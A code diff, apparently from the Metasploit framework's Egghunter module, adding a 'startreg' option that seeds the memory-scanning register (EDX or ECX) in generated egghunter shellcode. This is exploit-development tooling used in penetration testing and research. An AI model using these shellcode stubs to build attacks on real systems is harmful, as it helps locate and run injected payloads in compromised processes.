@@ -18,6 +18,7 @@ module Exploitation
 # Checksum checking implemented by dijital1/corelanc0d3r
 # Checksum code merged to Egghunter by jduck
 # Conversion to use Metasm by jduck
+# Startreg code added by corelanc0d3r
 #
 ###
 class Egghunter
@@ -38,12 +39,25 @@ class Egghunter
 			#
 			def hunter_stub(payload, badchars = '', opts = {})
 
+				startreg = opts[:startreg]
+
 				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
 				marker = "0x%x" % opts[:eggtag].unpack('V').first
 
 				checksum = checksum_stub(payload, badchars, opts)
 
+				startstub = ''
+				if startreg
+					if startreg.downcase != 'edx'
+						startstub = "\n\tmov edx,#{startreg}\n\tjmp next_addr"
+					else
+						startstub = "\n\tjmp next_addr"
+					end
+				end
+				startstub << "\n\t" if startstub.length > 0
+
 				assembly = <<EOS
+#{startstub}
 check_readable:
 	or dx,0xfff
 next_addr:
@@ -97,13 +111,26 @@ EOS
 			#
 			def hunter_stub(payload, badchars = '', opts = {})
 
+				startreg = opts[:startreg]
+
 				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
 				marker = "0x%x" % opts[:eggtag].unpack('V').first
 
 				checksum = checksum_stub(payload, badchars, opts)
 
+				startstub = ''
+				if startreg
+					if startreg.downcase != 'ecx'
+						startstub = "\n\tmov ecx,#{startreg}\n\tjmp next_addr"
+					else
+						startstub = "\n\tjmp next_addr"
+					end
+				end
+				startstub << "\n\t" if startstub.length > 0
+
 				assembly = <<EOS
 	cld
+#{startstub}
 check_readable:
 	or cx,0xfff
 next_addr:
